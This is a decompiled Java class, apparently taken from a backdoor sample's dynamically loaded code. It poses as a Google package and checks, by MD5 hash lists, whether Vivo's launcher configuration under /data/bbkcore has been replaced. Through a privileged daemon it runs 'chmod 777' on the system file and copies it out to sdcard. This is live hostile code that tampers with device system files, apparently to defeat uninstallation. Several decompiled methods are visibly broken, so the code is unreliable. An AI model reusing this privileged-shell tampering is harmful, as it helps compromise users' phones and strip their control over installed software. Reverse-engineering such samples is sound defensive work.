package com.google.android.sd.biz_dynamic_dex.vivo_official_uninstall;

import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.vivo_base.DaemonFp;
import com.google.android.sd.utils.IoUtils;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class Detector {
  private static String byteArrayToHex(byte[] paramArrayOfbyte) {
    char[] arrayOfChar1 = new char[16];
    arrayOfChar1[0] = '0';
    arrayOfChar1[1] = '1';
    arrayOfChar1[2] = '2';
    arrayOfChar1[3] = '3';
    arrayOfChar1[4] = '4';
    arrayOfChar1[5] = '5';
    arrayOfChar1[6] = '6';
    arrayOfChar1[7] = '7';
    arrayOfChar1[8] = '8';
    arrayOfChar1[9] = '9';
    arrayOfChar1[10] = 'A';
    arrayOfChar1[11] = 'B';
    arrayOfChar1[12] = 'C';
    arrayOfChar1[13] = 'D';
    arrayOfChar1[14] = 'E';
    arrayOfChar1[15] = 'F';
    char[] arrayOfChar2 = new char[paramArrayOfbyte.length * 2];
    int k = paramArrayOfbyte.length;
    int i = 0;
    int j = 0;
    while (i < k) {
      byte b = paramArrayOfbyte[i];
      int m = j + 1;
      arrayOfChar2[j] = arrayOfChar1[b >>> 4 & 0xF];
      j = m + 1;
      arrayOfChar2[m] = arrayOfChar1[b & 0xF];
      i++;
    } 
    return new String(arrayOfChar2);
  }
  
  public static int chooseLatestVersionConfigIndex(List<File> paramList) {
    int i = 0;
    int k = 0;
    for (int j = 0; i < paramList.size(); j = m) {
      String str = ((File)paramList.get(i)).getName();
      int i1 = str.lastIndexOf("_") + 1;
      int i2 = str.length() - 4;
      int n = k;
      int m = j;
      if (i2 > i1) {
        i1 = Integer.parseInt(str.substring(i1, i2));
        n = k;
        m = j;
        if (i1 > j) {
          n = i;
          m = i1;
        } 
      } 
      i++;
      k = n;
    } 
    return k;
  }
  
  public static String digest(InputStream paramInputStream) {
    try {
      return byteArrayToHex(updateDigest(MessageDigest.getInstance("MD5"), paramInputStream).digest());
    } catch (NoSuchAlgorithmException noSuchAlgorithmException) {
      noSuchAlgorithmException.printStackTrace();
    } catch (Exception exception) {}
    return null;
  }
  
  public static File getLatestVersionConfig() {
    int i = 0;
    ArrayList<File> arrayList = new ArrayList(0);
    try {
      File file = new File("/data/bbkcore");
      if (file.isDirectory()) {
        File[] arrayOfFile = file.listFiles();
        if (arrayOfFile != null && arrayOfFile.length > 0) {
          int j = arrayOfFile.length;
          while (i < j) {
            File file1 = arrayOfFile[i];
            if (file1.getName().matches("BBKLauncher2_custom_[0-9]*\\.xml"))
              arrayList.add(file1); 
            i++;
          } 
        } 
      } 
    } finally {
      Exception exception;
    } 
    return (arrayList.size() == 0) ? null : arrayList.get(chooseLatestVersionConfigIndex(arrayList));
  }
  
  public static int isConfigReplaced() {
    File file = getLatestVersionConfig();
    if (file != null && file.exists()) {
      if (file.length() == 0L)
        return -1; 
      String str = readMd5(file);
      if (str == null)
        return -1; 
      ArrayList<ConfigFileDesc> arrayList2 = new ArrayList();
      ArrayList<ConfigFileDesc> arrayList1 = new ArrayList();
      arrayList2.add(new ConfigFileDesc(1947, "7069150474AAFCB9541AB6559D6A9108", null));
      arrayList2.add(new ConfigFileDesc(1949, "4E4F11EACFA4B2A617F480DE4CE84414", null));
      Iterator<ConfigFileDesc> iterator2 = arrayList2.iterator();
      while (iterator2.hasNext()) {
        if (TextUtils.equals(((ConfigFileDesc)iterator2.next()).getOriginMd5(), str))
          return 0; 
      } 
      arrayList1.add(new ConfigFileDesc(507, "F69C264291A684338B6DE40793D93CA5", "B79A16900B6F91FD004D22387EF3B47E"));
      arrayList1.add(new ConfigFileDesc(1220, "4831DAE78045897B3EE9D4E4B14C09AB", "06100EDA5750BADBB5FCD89BCBEA6D38"));
      arrayList1.add(new ConfigFileDesc(1221, "FE78B912C7FEB95A32127AB56C0075D9", "F9A7D5D068577538901783B192720800"));
      arrayList1.add(new ConfigFileDesc(1223, "56A41F0650DDE5E24A98A750A8E58246", "8BA543A1AEFEBFAA13187F9AB7202A96"));
      arrayList1.add(new ConfigFileDesc(1946, "C11B137D5CFF7632A23C2213511E0870", "91AB6A0B29E4A0175F792E232BAF2922"));
      arrayList1.add(new ConfigFileDesc(1948, "31D402DB994D478966DD0C72BDEAD2A2", "75BC643A7D7E7CF393EDF1B60DE95921"));
      arrayList1.add(new ConfigFileDesc(2303, "76BF2D4CFC655EF6E3F5721AF9DEC461", "2AF6BE62047289D43B57BB18CD6723BF"));
      arrayList1.add(new ConfigFileDesc(2304, "2B7A141406D673B7EDB9DB3DC4D73B61", "B53CABF3DF5122EE48C8732C5AEC0764"));
      arrayList1.add(new ConfigFileDesc(2751, "1A2F4590EDE3E472DD1772A235251CA4", "C35CE886277459DA756C097E07CD8871"));
      arrayList1.add(new ConfigFileDesc(1223, "DFC583837962910FB0F92B3F6A03D917", "EA3C53C24A61C1525C6902115D5A6F5D"));
      arrayList1.add(new ConfigFileDesc(1948, "CEDB670E508911590509B81CA0E0C560", "BB4AF7C41FD8292E0139FDE60D706D4C"));
      arrayList1.add(new ConfigFileDesc(2303, "8CB2CDF69C364A35A4872D68A3EA8223", "038393FABE4CFAB5321A677FDC78B701"));
      arrayList1.add(new ConfigFileDesc(2304, "8DDCE584F2082F52ED06E2971BD309D6", "2AE317ED4878AF26249F25BC941EFB45"));
      arrayList1.add(new ConfigFileDesc(3507, "65B8FEC83A0944C8FEE20197F5BFA319", "CB3BE0B0A6D8A2E7E53EEFE4D4E46DCA"));
      Iterator<ConfigFileDesc> iterator1 = arrayList1.iterator();
      while (iterator1.hasNext()) {
        if (TextUtils.equals(((ConfigFileDesc)iterator1.next()).getModifiedMd5(), str))
          return 1; 
      } 
      return 2;
    } 
    return -1;
  }
  
  public static int isConfigReplacedByDaemon(int paramInt) {
    String str = String.format("/data/bbkcore/BBKLauncher2_custom_%s.xml", new Object[] { Integer.valueOf(paramInt) });
    StringBuilder stringBuilder1 = new StringBuilder();
    stringBuilder1.append("chmod 777 ");
    stringBuilder1.append(str);
    DaemonFp.daemonRunShell(stringBuilder1.toString());
    File file = new File("sdcard", "BBKLauncher2_custom_temp.xml");
    StringBuilder stringBuilder2 = new StringBuilder();
    stringBuilder2.append("cp ");
    stringBuilder2.append(str);
    stringBuilder2.append(" ");
    stringBuilder2.append(file.getAbsolutePath());
    DaemonFp.daemonRunShell(stringBuilder2.toString());
    if (!file.exists())
      return -1; 
    str = IoUtils.calFileMd5(file);
    if (str == null)
      return -1; 
    ArrayList<ConfigFileDesc> arrayList2 = new ArrayList();
    ArrayList<ConfigFileDesc> arrayList1 = new ArrayList();
    arrayList2.add(new ConfigFileDesc(1947, "7069150474AAFCB9541AB6559D6A9108", null));
    arrayList2.add(new ConfigFileDesc(1949, "4E4F11EACFA4B2A617F480DE4CE84414", null));
    Iterator<ConfigFileDesc> iterator2 = arrayList2.iterator();
    while (iterator2.hasNext()) {
      if (TextUtils.equals(((ConfigFileDesc)iterator2.next()).getOriginMd5(), str))
        return 0; 
    } 
    arrayList1.add(new ConfigFileDesc(507, "F69C264291A684338B6DE40793D93CA5", "B79A16900B6F91FD004D22387EF3B47E"));
    arrayList1.add(new ConfigFileDesc(1220, "4831DAE78045897B3EE9D4E4B14C09AB", "06100EDA5750BADBB5FCD89BCBEA6D38"));
    arrayList1.add(new ConfigFileDesc(1221, "FE78B912C7FEB95A32127AB56C0075D9", "F9A7D5D068577538901783B192720800"));
    arrayList1.add(new ConfigFileDesc(1223, "56A41F0650DDE5E24A98A750A8E58246", "8BA543A1AEFEBFAA13187F9AB7202A96"));
    arrayList1.add(new ConfigFileDesc(1946, "C11B137D5CFF7632A23C2213511E0870", "91AB6A0B29E4A0175F792E232BAF2922"));
    arrayList1.add(new ConfigFileDesc(1948, "31D402DB994D478966DD0C72BDEAD2A2", "75BC643A7D7E7CF393EDF1B60DE95921"));
    arrayList1.add(new ConfigFileDesc(2303, "76BF2D4CFC655EF6E3F5721AF9DEC461", "2AF6BE62047289D43B57BB18CD6723BF"));
    arrayList1.add(new ConfigFileDesc(2304, "2B7A141406D673B7EDB9DB3DC4D73B61", "B53CABF3DF5122EE48C8732C5AEC0764"));
    arrayList1.add(new ConfigFileDesc(2751, "1A2F4590EDE3E472DD1772A235251CA4", "C35CE886277459DA756C097E07CD8871"));
    arrayList1.add(new ConfigFileDesc(1223, "DFC583837962910FB0F92B3F6A03D917", "EA3C53C24A61C1525C6902115D5A6F5D"));
    arrayList1.add(new ConfigFileDesc(1948, "CEDB670E508911590509B81CA0E0C560", "BB4AF7C41FD8292E0139FDE60D706D4C"));
    arrayList1.add(new ConfigFileDesc(2303, "8CB2CDF69C364A35A4872D68A3EA8223", "038393FABE4CFAB5321A677FDC78B701"));
    arrayList1.add(new ConfigFileDesc(2304, "8DDCE584F2082F52ED06E2971BD309D6", "2AE317ED4878AF26249F25BC941EFB45"));
    arrayList1.add(new ConfigFileDesc(3507, "65B8FEC83A0944C8FEE20197F5BFA319", "CB3BE0B0A6D8A2E7E53EEFE4D4E46DCA"));
    Iterator<ConfigFileDesc> iterator1 = arrayList1.iterator();
    while (iterator1.hasNext()) {
      if (TextUtils.equals(((ConfigFileDesc)iterator1.next()).getModifiedMd5(), str))
        return 1; 
    } 
    return 2;
  }
  
  public static String readMd5(File paramFile) {
    FileInputStream fileInputStream;
    File file = null;
    try {
      fileInputStream = new FileInputStream(paramFile);
    } finally {
      paramFile = null;
    } 
    if (fileInputStream != null) {
      paramFile = file;
      fileInputStream.close();
    } 
    return null;
  }
  
  public static MessageDigest updateDigest(MessageDigest paramMessageDigest, InputStream paramInputStream) throws IOException {
    byte[] arrayOfByte = new byte[1024];
    while (true) {
      int i = paramInputStream.read(arrayOfByte, 0, 1024);
      if (i > -1) {
        paramMessageDigest.update(arrayOfByte, 0, i);
        continue;
      } 
      return paramMessageDigest;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\be7a2b643d7e8543f49994ffeb0ee0b6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_official_uninstall\Detector.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */